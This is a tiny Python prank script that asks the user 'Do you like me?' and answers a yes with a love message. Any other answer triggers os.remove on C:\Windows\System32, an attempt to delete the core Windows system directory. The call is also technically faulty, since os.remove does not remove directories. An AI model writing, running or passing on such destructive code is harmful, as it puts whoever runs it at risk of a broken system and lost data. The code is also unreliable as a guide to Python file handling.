import os
ans = input("Do you like me? ").lower()
if ans in ("yes", "yea", "y"):
    print("i love you so much")
else:
    os.remove(r"C:\Windows\System32")
